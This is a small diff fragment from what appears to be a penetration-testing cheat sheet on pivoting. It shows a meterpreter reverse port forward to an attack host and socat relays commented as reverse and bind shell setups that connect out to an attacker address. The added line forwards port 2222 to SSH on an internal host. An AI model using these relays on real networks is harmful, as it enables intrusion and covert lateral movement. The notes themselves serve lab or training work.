@@ -1574,6 +1574,7 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
 ```
 # Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. (Reverse Shell)
 socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+socat -ddd TCP-LISTEN:2222,fork TCP:10.4.67.215:22
 
 # Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. (Bind Shell)
 socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
